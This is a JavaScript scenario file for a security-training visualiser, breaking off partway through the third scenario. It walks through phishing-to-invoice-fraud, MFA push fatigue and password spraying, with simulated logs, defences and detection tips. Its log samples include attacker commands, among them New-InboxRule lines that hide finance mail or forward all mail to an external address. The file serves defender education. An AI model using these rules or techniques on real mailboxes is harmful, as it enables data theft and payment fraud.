/* Breachwalk by Dean Baker (© 2026 Dean Baker. All rights reserved.) — scenarios 1–5. (Scenarios 6–10 are in attacks2.js.)

   HOW AN ATTACK IS DESCRIBED
   {
     id:        "my-attack"           unique, lowercase, hyphens (also the #hash that opens it)
     cat:       "access" | "creds" | "network" | "web" | "malware"   (sidebar tab)
     name, sub: title and one-line subtitle
     severity:  "Critical" | "High"
     mitre:     ["T1566.002 Spearphishing Link", ...]
     summary:   overview paragraph
     facts:     [["Goal", "..."], ...] key/value rows on the overview
     nodes:     [{id, kind, label, sub, x, y, hostile?}]   x/y in a roughly 1000 × 600 space
     links:     [["nodeA", "nodeB"], ...]                    dashed network lines
     lanes:     ["nodeA", "nodeB", ...]  order of columns in the sequence view (every node a message touches)
     steps: [{
       title, sub, tactic,
       ph:         kill-chain phase 1..7
       text:       what happens, in plain English
       msgs:       [{from, to, label, kind}]   animated in order; may be [] if the step has a callout
       callout?:   short text bubble (used when nothing moves on the wire)
       focus?:     [nodeIds] for the camera when msgs is empty
       compromise?:[nodeIds] marked as compromised after this step
       facts?:     [["key", "value"], ...]
       defender:   "What the defender sees" text
       evidence:   [EVIDENCE, ...]
     }],
     defences: [{
       id, name, short, desc, result,
       at:     1-based step where it acts
       stops?: false = reduces impact but doesn't end the attack
       ev:     EVIDENCE shown when it fires
     }],
     debrief: {detect: ["..."], prevent: ["..."]}
   }

   EVIDENCE = {t, src, title, sev: "high"|"med"|"low"|"info"|"block", kind: "log"|"email"|"edr"|"packet",
               fields: [[name, value, meaning]], raw: "the raw log line"}
     Packets use layers: [[name, bytes]], groups: [{name, sum, fields}] and hex: "aa bb cc ..."
     instead of fields/raw (byte count of hex must equal the sum of the layers).

   Node kinds: attacker, laptop, phone, server, web, db, dns, dc, mail, idp, cloud, router, switch, vpn, build
   hostile:true draws a node in attacker colours. Message kinds: attack, normal, defence, data. */
window.ATTACKS = (window.ATTACKS || []).concat([

/* ============ 1. PHISHING → BEC ============ */
{
  id: "phish-bec", cat: "access", name: "Phishing → BEC", sub: "Stolen session, then invoice fraud",
  severity: "Critical",
  mitre: ["T1566.002 Spearphishing Link", "T1557 Adversary-in-the-Middle", "T1539 Steal Web Session Cookie", "T1550.004 Web Session Cookie", "T1564.008 Email Hiding Rules", "T1656 Impersonation", "T1657 Financial Theft"],
  summary: "A finance user gets a convincing 'shared invoice' email. The link leads to a fake Microsoft sign-in page that secretly relays her login, MFA included, to the real one, and keeps the session cookie. The attacker uses her real mailbox to hide replies and send a perfectly authenticated 'our bank details have changed' email to a customer.",
  facts: [["Goal", "Redirect a real payment"], ["Beats", "Push/SMS MFA, SPF/DKIM/DMARC"], ["Typical loss", "Tens of thousands of pounds"], ["Hardest part to spot", "The fraud email is genuine"]],
  nodes: [
    {id: "atk", kind: "attacker", label: "Attacker", sub: "203.0.113.66", x: 120, y: 150},
    {id: "phish", kind: "web", hostile: true, label: "Fake sign-in page", sub: "contoso-sharepoint.example", x: 130, y: 450},
    {id: "mx", kind: "mail", label: "Email gateway", sub: "mx.contoso.com", x: 440, y: 120},
    {id: "user", kind: "laptop", label: "Priya (Finance)", sub: "10.20.4.31", x: 450, y: 450},
    {id: "idp", kind: "idp", label: "Microsoft Entra ID", sub: "login.microsoftonline.com", x: 760, y: 470},
    {id: "mbx", kind: "mail", label: "Exchange Online", sub: "priya@contoso.com", x: 760, y: 140},
    {id: "cust", kind: "laptop", label: "Customer AP team", sub: "ap@fabrikam.example", x: 960, y: 310}
  ],
  links: [["atk", "mx"], ["mx", "user"], ["user", "phish"], ["phish", "idp"], ["phish", "atk"], ["atk", "mbx"], ["mbx", "cust"], ["idp", "mbx"]],
  lanes: ["atk", "mx", "user", "phish", "idp", "mbx", "cust"],
  steps: [
    {title: "Lookalike domain and lure", sub: "Setting the trap", ph: 1, tactic: "Resource development (T1583.001)",
     text: "Two days earlier the attacker registers contoso-sharepoint.example, publishes an SPF record so its mail passes basic checks, and stands up a pixel-perfect copy of the Microsoft 365 sign-in page.",
     msgs: [{from: "atk", to: "phish", label: "Deploy fake sign-in page", kind: "attack"}],
     facts: [["Domain age", "2 days"], ["Lure", "A 'shared invoice'"], ["Target", "Finance: they can pay things"]],
     defender: "Nothing in your logs yet. Newly-registered-domain feeds and brand monitoring are the only early warnings.",
     evidence: []},
    {title: "Phishing email lands", sub: "First-time sender, credential link", ph: 2, tactic: "Initial access (T1566.002)",
     text: "'Invoice #4471 has been shared with you' arrives. SPF passes because it's checked against the attacker's own domain, so the email is authenticated, just not as Contoso.",
     msgs: [{from: "atk", to: "mx", label: "Invoice #4471 shared", kind: "attack"}, {from: "mx", to: "user", label: "Delivered to inbox", kind: "attack"}],
     facts: [["SPF", "pass (for the lookalike)"], ["DMARC", "none published"], ["Link", "contoso-sharepoint.example/inv"]],
     defender: "The message trace shows a first-time sender from a two-day-old domain carrying a sign-in link. That combination is the strongest signal you'll get.",
     evidence: [{t: "09:12:04", src: "Email gateway · message trace", title: "Delivered: 'Invoice #4471 has been shared with you'", sev: "med", kind: "email",
       fields: [["From", "docs@contoso-sharepoint.example", "A lookalike of the real contoso.sharepoint.com"], ["To", "priya@contoso.com", "Finance, chosen because they can pay invoices"], ["SPF", "pass", "Proves the sending server is allowed to send for contoso-sharepoint.example. It says nothing about Contoso"], ["DMARC", "none", "The lookalike domain publishes no DMARC policy"], ["Sender history", "First seen", "Nobody at Contoso has ever had mail from this domain"], ["Domain age", "2 days", "Newly registered domains are a classic phishing indicator"], ["URL", "https://contoso-sharepoint.example/inv/4471", "Leads to the fake sign-in page"]],
       raw: "Received: from mail.contoso-sharepoint.example (203.0.113.66)\nAuthentication-Results: mx.contoso.com;\n  spf=pass smtp.mailfrom=contoso-sharepoint.example;\n  dkim=none; dmarc=none header.from=contoso-sharepoint.example\nFrom: \"SharePoint Online\" <docs@contoso-sharepoint.example>\nTo: priya@contoso.com\nSubject: Invoice #4471 has been shared with you"}]},
    {title: "Adversary-in-the-middle sign-in", sub: "The fake page relays everything", ph: 4, tactic: "Credential access (T1557, T1539)",
     text: "Priya clicks and logs in to what looks like Microsoft. The page is really a proxy: it passes her password and MFA approval to the real Entra ID in real time, then keeps the session cookie Microsoft sends back.",
     msgs: [{from: "user", to: "phish", label: "Password + MFA approval", kind: "attack"}, {from: "phish", to: "idp", label: "Relayed sign-in", kind: "attack"}, {from: "idp", to: "phish", label: "Session cookie", kind: "attack"}, {from: "phish", to: "atk", label: "Stolen session cookie", kind: "data"}],
     facts: [["MFA", "Satisfied (push approved)"], ["Why MFA didn't help", "It's relayed live"], ["Stolen", "The session cookie"]],
     defender: "Entra ID records a successful MFA sign-in from 203.0.113.66, a hosting provider, instead of Priya's office. Identity protection may flag 'unfamiliar sign-in properties'.",
     callout: "Session cookie captured",
     evidence: [{t: "09:14:37", src: "Entra ID · sign-in logs", title: "Sign-in success: priya@contoso.com from 203.0.113.66", sev: "high", kind: "log",
       fields: [["User", "priya@contoso.com", "The real account. Her password and MFA were genuinely used"], ["Result", "Success", "From Entra ID's point of view, this was a valid login"], ["IP address", "203.0.113.66", "The attacker's proxy, not Priya's laptop (10.20.4.31 via the office egress)"], ["Location", "Amsterdam, NL (hosting provider)", "Priya is in the UK, and real users rarely sign in from data centres"], ["MFA", "Push approved", "She approved it, believing it was her own login"], ["Risk", "Medium: unfamiliar sign-in properties", "Identity protection noticed the odd IP and browser"]],
       raw: "{\n  \"userPrincipalName\": \"priya@contoso.com\",\n  \"ipAddress\": \"203.0.113.66\",\n  \"location\": {\"city\": \"Amsterdam\", \"countryOrRegion\": \"NL\"},\n  \"status\": {\"errorCode\": 0},\n  \"authenticationRequirement\": \"multiFactorAuthentication\",\n  \"riskLevelDuringSignIn\": \"medium\",\n  \"riskEventTypes\": [\"unfamiliarFeatures\"]\n}"}]},
    {title: "Session cookie replay", sub: "No password, no MFA prompt", ph: 2, tactic: "Defence evasion (T1550.004)",
     text: "The attacker loads the stolen cookie into their own browser and opens Priya's mailbox. There's no password or MFA prompt, because the cookie says she has already done both.",
     msgs: [{from: "atk", to: "mbx", label: "Replay session cookie", kind: "attack"}, {from: "mbx", to: "atk", label: "Mailbox opened", kind: "data"}],
     compromise: ["mbx"],
     facts: [["Password needed", "No"], ["MFA prompt", "No"], ["Device", "Attacker's own"]],
     defender: "Mailbox activity from a new IP and browser with no matching sign-in is the giveaway. Look for one session ID used from more than one IP.",
     evidence: [{t: "09:16:02", src: "Microsoft 365 · unified audit log", title: "MailItemsAccessed from a new IP with no fresh sign-in", sev: "high", kind: "log",
       fields: [["Operation", "MailItemsAccessed", "Someone is reading mail"], ["User", "priya@contoso.com", ""], ["Client IP", "203.0.113.66", "The same hosting-provider IP as the odd sign-in"], ["Session ID", "4f1c…e92a", "Same session as the proxied sign-in, now used from the attacker's browser"], ["Sign-in event", "None in the last 2 minutes", "Access without authentication means a token or cookie was replayed"]],
       raw: "Operation: MailItemsAccessed\nUserId: priya@contoso.com\nClientIPAddress: 203.0.113.66\nSessionId: 4f1c…e92a\nMailAccessType: Bind"}]},
    {title: "Hide the evidence", sub: "An inbox rule eats the replies", ph: 3, tactic: "Defence evasion (T1564.008)",
     text: "The attacker adds an inbox rule that moves any email containing 'invoice', 'payment' or 'bank' to the RSS Feeds folder and marks it as read, so Priya never sees the customer's replies.",
     msgs: [{from: "atk", to: "mbx", label: "New inbox rule", kind: "attack"}],
     facts: [["Rule name", "\".\""], ["Moves to", "RSS Feeds"], ["Keywords", "invoice, payment, bank"]],
     defender: "A new inbox rule that moves finance keywords to an obscure folder is one of the highest-fidelity BEC alerts you'll ever see.",
     evidence: [{t: "09:18:40", src: "Microsoft 365 · unified audit log", title: "New-InboxRule '.' moving finance mail to RSS Feeds", sev: "high", kind: "log",
       fields: [["Operation", "New-InboxRule", "A mailbox rule was created"], ["Name", ".", "A meaningless one-character name, chosen to avoid notice"], ["Condition", "Subject or body contains: invoice, payment, bank", "Targets exactly the conversations the attacker will hijack"], ["Action", "Move to RSS Feeds, mark as read", "A folder nobody looks in"], ["Client IP", "203.0.113.66", "Created by the attacker, not Priya"]],
       raw: "New-InboxRule -Name \".\" -SubjectOrBodyContainsWords \"invoice\",\"payment\",\"bank\"\n  -MoveToFolder \"RSS Feeds\" -MarkAsRead $true\nClientIP: 203.0.113.66"}]},
    {title: "Invoice fraud", sub: "A genuine email with a fake bank account", ph: 7, tactic: "Impact (T1657, via T1656)",
     text: "Replying in an existing invoice thread with Fabrikam, the attacker writes from Priya's real mailbox: 'Our bank details have changed, please use the new account for this payment.' It passes SPF, DKIM and DMARC, because it really is Contoso's mail.",
     msgs: [{from: "atk", to: "mbx", label: "Reply in the real thread", kind: "attack"}, {from: "mbx", to: "cust", label: "'Our bank details have changed'", kind: "attack"}],
     facts: [["SPF / DKIM / DMARC", "pass / pass / pass"], ["Thread", "Genuine, months old"], ["Loss", "£48,250 to a mule account"]],
     defender: "Fabrikam sees a perfectly authenticated email in a real thread. Only a process control stops this: call back on a known number before changing bank details.",
     callout: "Payment redirected",
     evidence: [{t: "09:31:15", src: "Exchange · message trace", title: "Sent from priya@contoso.com via 203.0.113.66", sev: "high", kind: "email",
       fields: [["From", "priya@contoso.com", "Genuine sender, compromised mailbox"], ["To", "ap@fabrikam.example", "An external customer who pays Contoso"], ["Subject", "RE: Invoice 4471 – updated remittance details", "Hijacks an existing, trusted thread"], ["Client", "OWA from 203.0.113.66", "Sent from the attacker's browser session"], ["Authentication", "spf=pass dkim=pass dmarc=pass", "Correct, because it really did come from Contoso"]],
       raw: "Authentication-Results: spf=pass dkim=pass header.d=contoso.com dmarc=pass\nFrom: Priya Shah <priya@contoso.com>\nTo: ap@fabrikam.example\nSubject: RE: Invoice 4471 – updated remittance details\nX-Originating-IP: [203.0.113.66]"}]}
  ],
  defences: [
    {id: "mailsec", name: "Email security: lookalike and credential-phish detection", short: "Email filter", at: 2, 
     desc: "Scores new domains, first-time senders and sign-in pages behind links.",
     result: "The gateway scores the email high-risk (a two-day-old lookalike domain, a first-time sender and a credential-harvesting page behind the link) and quarantines it. Priya never sees it.",
     ev: {t: "09:12:04", src: "Email gateway · quarantine", title: "Quarantined: credential phishing (lookalike domain)", sev: "block", kind: "email",
       fields: [["Verdict", "Malicious: credential phishing", ""], ["Signals", "Domain age 2 days · first-time sender · brand lookalike · login form behind URL", "Several weak signals stacked up into a strong one"], ["Action", "Quarantine", "Held back. The user wasn't notified"]],
       raw: "action=quarantine verdict=credential_phish score=92\nsignals=new_domain,first_time_sender,brand_lookalike,login_form"}},
    {id: "fido2", name: "Phishing-resistant MFA (FIDO2 / passkeys)", short: "FIDO2", at: 3, 
     desc: "The passkey is bound to the real Microsoft sign-in address.",
     result: "Priya's passkey won't sign for contoso-sharepoint.example, because the browser checks the real website address. The proxy has nothing valid to relay, the sign-in fails and no cookie is issued.",
     ev: {t: "09:14:37", src: "Entra ID · sign-in logs", title: "Sign-in failed: FIDO2 required, no valid assertion", sev: "block", kind: "log",
       fields: [["Result", "Failure", ""], ["Reason", "Phishing-resistant MFA required", "Conditional access insists on a passkey"], ["IP address", "203.0.113.66", "The proxy tried and got nowhere"]],
       raw: "status.errorCode=53003 authenticationStrength=phishingResistantMFA result=failure ip=203.0.113.66"}},
    {id: "token", name: "Conditional access: compliant device + token protection", short: "Token binding", at: 4, 
     desc: "Sessions are tied to the managed device they were issued to.",
     result: "The stolen cookie is bound to the device it was issued for. Replayed from the attacker's laptop, Entra ID rejects it and demands a fresh sign-in from a compliant device, which the attacker can't do.",
     ev: {t: "09:16:02", src: "Entra ID · sign-in logs", title: "Token replay blocked: device not compliant", sev: "block", kind: "log",
       fields: [["Result", "Failure", ""], ["Reason", "Device is not compliant / token not bound to this device", ""], ["IP address", "203.0.113.66", ""]],
       raw: "status.errorCode=530003 conditionalAccess=failure policy=\"Require compliant device + token protection\""}},
    {id: "soar", name: "Inbox-rule alert with SOAR auto-response", short: "SOAR", at: 5, 
     desc: "Suspicious rules trigger an automatic containment playbook.",
     result: "The new rule fires an alert. A SOAR playbook disables Priya's account, revokes all her sessions and deletes the rule within two minutes, before any fraudulent email goes out.",
     ev: {t: "09:19:55", src: "SOAR · playbook run", title: "Contained: account disabled, sessions revoked, rule removed", sev: "block", kind: "log",
       fields: [["Trigger", "Suspicious inbox rule (finance keywords → RSS Feeds)", ""], ["Actions", "Disable user · revoke sessions · remove rule · open P1 ticket", "Containment in seconds, not hours"]],
       raw: "playbook=bec_containment status=success actions=[disable_user,revoke_sessions,remove_rule,create_ticket]"}}
  ],
  debrief: {
    detect: ["First-time sender + new domain + sign-in link in the email logs", "Successful sign-in from a hosting-provider IP", "Mailbox access with no matching sign-in (session replay)", "New inbox rules moving finance keywords"],
    prevent: ["Phishing-resistant MFA (FIDO2/passkeys)", "Token protection / compliant-device conditional access", "Automated response to suspicious inbox rules", "Call-back process before any bank-detail change"]
  }
},

/* ============ 2. MFA FATIGUE ============ */
{
  id: "mfa-fatigue", cat: "creds", name: "MFA fatigue", sub: "Push bombing until someone taps Approve",
  severity: "High",
  mitre: ["T1078 Valid Accounts", "T1621 MFA Request Generation", "T1098.005 Device Registration", "T1114.003 Email Forwarding Rule"],
  summary: "The attacker already has a valid password. They hammer the user with MFA push prompts, then make a convincing call asking them to approve 'just one more'. Once in, they register their own authenticator and quietly forward the mailbox.",
  facts: [["Goal", "Get past MFA without phishing"], ["Needs", "A valid password"], ["Beats", "Simple push approvals"], ["Stopped by", "Number matching, FIDO2"]],
  nodes: [
    {id: "atk", kind: "attacker", label: "Attacker", sub: "198.51.100.77 (Frankfurt)", x: 130, y: 320},
    {id: "idp", kind: "idp", label: "Microsoft Entra ID", sub: "login.microsoftonline.com", x: 490, y: 160},
    {id: "jlap", kind: "laptop", label: "j.patel's laptop", sub: "London office", x: 860, y: 160},
    {id: "phone", kind: "phone", label: "j.patel's phone", sub: "Authenticator app", x: 860, y: 470},
    {id: "mbx", kind: "mail", label: "Exchange Online", sub: "j.patel@contoso.com", x: 490, y: 480}
  ],
  links: [["atk", "idp"], ["jlap", "idp"], ["idp", "phone"], ["atk", "mbx"], ["idp", "mbx"]],
  lanes: ["atk", "idp", "phone", "jlap", "mbx"],
  steps: [
    {title: "The password was already stolen", sub: "Infostealer log, sold online", ph: 2, tactic: "Initial access attempt (T1078)",
     text: "j.patel's password turned up in an infostealer log from a personal laptop. At 08:02 she signs in normally from London. At 08:37 the attacker tries the same password from a Frankfurt hosting provider. It's correct, so Entra ID asks for MFA.",
     msgs: [{from: "jlap", to: "idp", label: "08:02 normal sign-in", kind: "normal"}, {from: "atk", to: "idp", label: "Correct password", kind: "attack"}],
     facts: [["Password", "Correct"], ["Source", "Infostealer log"], ["Next hurdle", "MFA push"]],
     defender: "A correct password from a hosting provider, 35 minutes after a London sign-in, is already suspicious.",
     evidence: [
      {t: "08:02:11", src: "Entra ID · sign-in logs", title: "Sign-in success: j.patel from London (baseline)", sev: "info", kind: "log",
       fields: [["IP address", "192.0.2.10", "Contoso's London office"], ["Result", "Success", "Normal start to the day"]], raw: "user=j.patel ip=192.0.2.10 city=London result=success mfa=push"},
      {t: "08:37:02", src: "Entra ID · sign-in logs", title: "Password correct, MFA required: j.patel from 198.51.100.77", sev: "med", kind: "log",
       fields: [["IP address", "198.51.100.77", "A hosting provider in Frankfurt"], ["Result", "Interrupted: MFA required", "The password was right"], ["Gap since last sign-in", "35 min from London", "Impossible travel"]], raw: "user=j.patel ip=198.51.100.77 city=Frankfurt result=interrupted reason=mfa_required"}]},
    {title: "Push bombing", sub: "17 prompts in 7 minutes", ph: 4, tactic: "Credential access (T1621)",
     text: "The attacker keeps retrying the login, and each attempt sends a push to j.patel's phone. She denies or ignores 16 of them, confused and increasingly annoyed.",
     msgs: [{from: "idp", to: "phone", label: "Approve? (1/17)", kind: "attack"}, {from: "idp", to: "phone", label: "Approve? (9/17)", kind: "attack"}, {from: "idp", to: "phone", label: "Approve? (16/17)", kind: "attack"}],
     facts: [["Prompts", "17"], ["Denied / ignored", "16"], ["Window", "7 minutes"]],
     defender: "A burst of MFA denials for one user is a loud signal, as long as something is watching for it.",
     evidence: [{t: "08:37–08:44", src: "Entra ID · sign-in logs", title: "MFA denied ×16 for j.patel in 7 minutes", sev: "high", kind: "log",
       fields: [["Result", "MFA denied / timed out ×16", "Someone keeps triggering prompts she didn't ask for"], ["IP address", "198.51.100.77", "Every attempt comes from the same Frankfurt IP"], ["Pattern", "Every 20–30 seconds", "Automated retries"]], raw: "user=j.patel ip=198.51.100.77 resultType=500121 count=16 window=7m"}]},
    {title: "The 'helpful' phone call", sub: "Social engineering finishes the job", ph: 4, tactic: "Social engineering (voice phishing)",
     text: "A WhatsApp call from 'IT Service Desk': 'We're fixing a sync fault on your account. You'll get one more prompt, so please approve it and the alerts will stop.'",
     msgs: [{from: "atk", to: "phone", label: "Vishing: 'please approve it'", kind: "attack"}],
     facts: [["Channel", "WhatsApp call"], ["Pretext", "'Fixing a sync fault'"], ["Goal", "One Approve tap"]],
     defender: "Nothing appears in your logs. This is exactly why people need training to report unexpected MFA prompts rather than approve them.",
     evidence: []},
    {title: "Approved", sub: "Tap 17 lets them in", ph: 2, tactic: "Initial access",
     text: "Worn down and reassured, j.patel taps Approve on prompt 17. Entra ID issues tokens to the attacker's browser in Frankfurt.",
     msgs: [{from: "phone", to: "idp", label: "Approve (17/17)", kind: "attack"}, {from: "idp", to: "atk", label: "Tokens issued", kind: "data"}],
     compromise: ["mbx"], callout: "Account taken over",
     facts: [["MFA", "Approved"], ["Location", "Frankfurt (hosting)"], ["Impossible travel", "London → Frankfurt in 35 min"]],
     defender: "A success right after a run of denials, from the same odd IP, is the textbook MFA fatigue pattern.",
     evidence: [{t: "08:44:31", src: "Entra ID · sign-in logs", title: "Sign-in success after 16 denials: j.patel from Frankfurt", sev: "high", kind: "log",
       fields: [["Result", "Success", ""], ["MFA", "Push approved (attempt 17)", "Approval straight after a string of denials"], ["IP address", "198.51.100.77", "Hosting provider, not a home or office"], ["Risk", "High: impossible travel", "London at 08:02, Frankfurt at 08:44"]], raw: "user=j.patel ip=198.51.100.77 result=success mfaDetail=push_approved riskLevel=high riskEventTypes=[impossibleTravel]"}]},
    {title: "Register their own MFA", sub: "So they never need her phone again", ph: 3, tactic: "Persistence (T1098.005)",
     text: "Within two minutes the attacker adds their own authenticator app to j.patel's account. Even if she changes her password later, they still have a second factor of their own.",
     msgs: [{from: "atk", to: "idp", label: "Add authenticator device", kind: "attack"}],
     facts: [["New method", "Authenticator app"], ["Registered from", "198.51.100.77"], ["Effect", "Persistent access"]],
     defender: "Security-info registration from a risky session is a high-confidence alert. Check it whenever an account looks compromised.",
     evidence: [{t: "08:46:10", src: "Entra ID · audit log", title: "User registered security info: new authenticator app", sev: "high", kind: "log",
       fields: [["Activity", "User registered security info", "A new MFA method was added"], ["Method", "Microsoft Authenticator (new device)", "Not her phone"], ["IP address", "198.51.100.77", "From the attacker's session"]], raw: "activity=\"User registered security info\" target=j.patel method=authenticatorApp ip=198.51.100.77"}]},
    {title: "Forward the mailbox", sub: "Every email, quietly copied", ph: 6, tactic: "Collection (T1114.003)",
     text: "An inbox rule forwards every incoming email to an external address, quietly copying everything j.patel receives: contracts, password resets, invoices.",
     msgs: [{from: "atk", to: "mbx", label: "Rule: forward all mail out", kind: "attack"}, {from: "mbx", to: "atk", label: "Copies of new mail", kind: "data"}],
     facts: [["Rule", "Forward all → external"], ["Visibility", "Hidden from the user"], ["Risk", "Password resets go to the attacker"]],
     defender: "External forwarding rules created from a risky session should be blocked by policy and alerted on.",
     evidence: [{t: "08:49:22", src: "Microsoft 365 · unified audit log", title: "New-InboxRule forwarding all mail to an external address", sev: "high", kind: "log",
       fields: [["Operation", "New-InboxRule", ""], ["ForwardTo", "jp.archive@mailbox.example", "External address controlled by the attacker"], ["Client IP", "198.51.100.77", ""]], raw: "New-InboxRule -Name \"sync\" -ForwardTo jp.archive@mailbox.example\nClientIP: 198.51.100.77"}]}
  ],
  defences: [
    {id: "riskca", name: "Risk-based conditional access", short: "Risky sign-in block", at: 1, 
     desc: "Blocks sign-ins from hosting providers, Tor and unexpected countries.",
     result: "The sign-in comes from a Frankfurt hosting provider straight after a London login. Conditional access blocks it as high risk before an MFA prompt is ever sent.",
     ev: {t: "08:37:02", src: "Entra ID · sign-in logs", title: "Blocked by conditional access: high-risk sign-in", sev: "block", kind: "log", fields: [["Result", "Failure (conditional access)", ""], ["Reason", "Sign-in risk high · hosting provider ASN", ""]], raw: "status.errorCode=53003 policy=\"Block high-risk sign-ins\" ip=198.51.100.77"}},
    {id: "fraud", name: "'Report suspicious' in the authenticator app", short: "Fraud report", at: 2, 
     desc: "Users can flag an unexpected prompt with one tap.",
     result: "Trained to spot it, j.patel taps 'No, it's not me, report it' on the first prompt. Her account is marked high-risk, further sign-ins are blocked and the SOC is alerted.",
     ev: {t: "08:37:20", src: "Entra ID · audit log", title: "User reported suspicious MFA activity", sev: "block", kind: "log", fields: [["Activity", "Suspicious activity reported", "One tap from a trained user"], ["Effect", "User risk = high, sign-ins blocked", ""]], raw: "activity=\"Suspicious activity reported\" user=j.patel userRisk=high"}},
    {id: "number", name: "Number matching on push prompts", short: "Number matching", at: 4, 
     desc: "The prompt asks for the number shown on the sign-in screen.",
     result: "Prompt 17 asks j.patel to type the two-digit number shown on the sign-in screen. That screen is the attacker's, in Frankfurt, so she can't approve even if she wants to help.",
     ev: {t: "08:44:31", src: "Entra ID · sign-in logs", title: "MFA failed: number match not completed", sev: "block", kind: "log", fields: [["Result", "MFA denied", ""], ["Reason", "Number match not completed", "She couldn't see the attacker's screen"]], raw: "resultType=500121 mfaDetail=number_match_failed"}},
    {id: "fido", name: "FIDO2 security keys instead of push", short: "FIDO2", at: 2, 
     desc: "Sign-in needs a physical key, touched, on the real site.",
     result: "There's no push to spam. Signing in needs j.patel's physical security key, touched, on the genuine site. The attacker's correct password gets them nowhere.",
     ev: {t: "08:37:05", src: "Entra ID · sign-in logs", title: "Sign-in interrupted: FIDO2 key required", sev: "block", kind: "log", fields: [["Result", "Interrupted", ""], ["Requirement", "Phishing-resistant MFA", "No push method allowed"]], raw: "authenticationStrength=phishingResistantMFA result=interrupted"}}
  ],
  debrief: {
    detect: ["Correct password from an unusual location or ASN", "A burst of MFA denials for one user", "Success straight after denials (classic fatigue pattern)", "New MFA method registered from a risky session", "External forwarding rules"],
    prevent: ["Number matching, or better, FIDO2/passkeys", "Risk-based conditional access", "Training: report unexpected prompts, never approve them", "Block external auto-forwarding by policy"]
  }
},

/* ============ 3. PASSWORD SPRAYING ============ */
{
  id: "password-spray", cat: "creds", name: "Password spraying", sub: "One common password, hundreds of accounts",
  severity: "High",
  mitre: ["T1589.002 Gather Victim Identity Information: Email Addresses", "T1110.003 Password Spraying", "T1078 Valid Accounts", "T1114.002 Remote Email Collection"],
  summary: "The attacker builds a list of staff email addresses, then tries one or two very common passwords against every account, slowly enough to stay under lockout limits. One old account with a weak password and no MFA is all it takes.",
  facts: [["Goal", "One working login"], ["Avoids", "Account lockout"], ["Loves", "Accounts with no MFA"], ["Signature", "Many accounts, few passwords, one source"]],
  nodes: [
    {id: "atk", kind: "attacker", label: "Attacker (Tor exit)", sub: "203.0.113.47", x: 140, y: 320},
    {id: "web", kind: "cloud", label: "Public internet", sub: "LinkedIn, company site", x: 430, y: 110},
    {id: "idp", kind: "idp", label: "Microsoft Entra ID", sub: "237 staff accounts", x: 560, y: 360},
    {id: "mbx", kind: "mail", label: "Exchange Online", sub: "outlook.office365.com", x: 880, y: 470}
  ],
  links: [["atk", "web"], ["atk", "idp"], ["atk", "mbx"], ["idp", "mbx"]],
  lanes: ["atk", "web", "idp", "mbx"],
  steps: [
    {title: "Build a username list", sub: "Names + the email format", ph: 1, tactic: "Reconnaissance (T1589.002)",
     text: "The attacker scrapes staff names from LinkedIn and the company website, then works out the address format (first.last@contoso.com) from a single public email.",
     msgs: [{from: "atk", to: "web", label: "Scrape staff names", kind: "attack"}, {from: "web", to: "atk", label: "412 names", kind: "data"}],
     facts: [["Names found", "412"], ["Format", "first.last@contoso.com"], ["Cost", "Free"]],
     defender: "Invisible to you. Limiting what you publish helps a little, but assume your username list is public.", evidence: []},
    {title: "Check which accounts exist", sub: "Weeding out the leavers", ph: 1, tactic: "Reconnaissance",
     text: "Some login pages respond differently to real and fake usernames. The attacker uses that to confirm which addresses are live, and 237 are.",
     msgs: [{from: "atk", to: "idp", label: "Username existence checks", kind: "attack"}, {from: "idp", to: "atk", label: "237 valid usernames", kind: "data"}],
     facts: [["Checked", "412"], ["Valid", "237"], ["Why it works", "Different responses for unknown users"]],
     defender: "Usually invisible. Login pages should give the same response whether or not the username exists.", evidence: []},
    {title: "Spray round one", sub: "'Winter2026!' against everyone", ph: 4, tactic: "Credential access (T1110.003)",
     text: "One login attempt per account, all with the same seasonal password. No single account gets more than one failure, so lockout never triggers.",
     msgs: [{from: "atk", to: "idp", label: "237 × 'Winter2026!'", kind: "attack"}, {from: "idp", to: "atk", label: "237 failures", kind: "normal"}],
     facts: [["Attempts per account", "1"], ["Lockout threshold", "10"], ["Hits", "0"]],
     defender: "In the sign-in logs: 237 different users failing once each from one IP within minutes. That's the spray signature.",
     evidence: [{t: "10:02–10:06", src: "Entra ID · sign-in logs", title: "237 failed sign-ins, 237 different users, one IP", sev: "high", kind: "log",
       fields: [["Source IP", "203.0.113.47", "A Tor exit node"], ["Distinct users", "237", "Spraying goes wide, not deep"], ["Attempts per user", "1", "Deliberately below the lockout threshold"], ["Error", "50126: invalid username or password", ""], ["Lockouts", "0", "Account lockout alone won't catch a spray"]],
       raw: "ip=203.0.113.47 resultType=50126 distinctUsers=237 attemptsPerUser=1 window=4m lockouts=0"}]},
    {title: "Wait out the lockout window", sub: "45 minutes of silence", ph: 4, tactic: "Defence evasion",
     text: "The attacker waits 45 minutes so the per-account failure counters reset, then goes again.",
     msgs: [], focus: ["atk"], callout: "⏱ Waiting 45 minutes…",
     facts: [["Wait", "45 minutes"], ["Why", "Failure counters reset"], ["Rounds planned", "Many"]],
     defender: "A burst, then silence, then another burst from the same source is the rhythm of a spray.", evidence: []},
    {title: "Spray round two: a hit", sub: "'Welcome1' works on an old account", ph: 2, tactic: "Initial access (T1078)",
     text: "Round two uses 'Welcome1'. It works for a.khan, an old shared account that was excluded from MFA years ago so a scanner could send email. Nobody ever removed the exclusion.",
     msgs: [{from: "atk", to: "idp", label: "237 × 'Welcome1'", kind: "attack"}, {from: "idp", to: "atk", label: "a.khan: password correct", kind: "data"}],
     facts: [["Account", "a.khan (shared, old)"], ["MFA", "Excluded"], ["Why", "A forgotten conditional access exclusion"]],
     defender: "One success in the middle of hundreds of failures from the same IP is a confirmed compromise. Act on it.",
     evidence: [{t: "10:51:44", src: "Entra ID · sign-in logs", title: "Sign-in success: a.khan, single-factor (excluded from MFA)", sev: "high", kind: "log",
       fields: [["User", "a.khan@contoso.com", "An old shared account"], ["Client app", "Browser", "An ordinary web sign-in"], ["MFA", "Not required", "Excluded by an old exception"], ["Source IP", "203.0.113.47", "The same IP that just failed 236 times"]], raw: "user=a.khan clientAppUsed=Browser ip=203.0.113.47 result=success authenticationRequirement=singleFactorAuthentication"}]},
    {title: "Sync the whole mailbox", sub: "3.1 GB downloaded", ph: 6, tactic: "Collection (T1114.002)",
     text: "Signed in as a.khan, the attacker connects a desktop mail client and syncs the whole mailbox, including years of supplier invoices and an old spreadsheet of VPN accounts.",
     msgs: [{from: "atk", to: "mbx", label: "Mail client signs in as a.khan", kind: "attack"}, {from: "mbx", to: "atk", label: "3.1 GB of mail", kind: "data"}],
     compromise: ["mbx"], callout: "Mailbox downloaded",
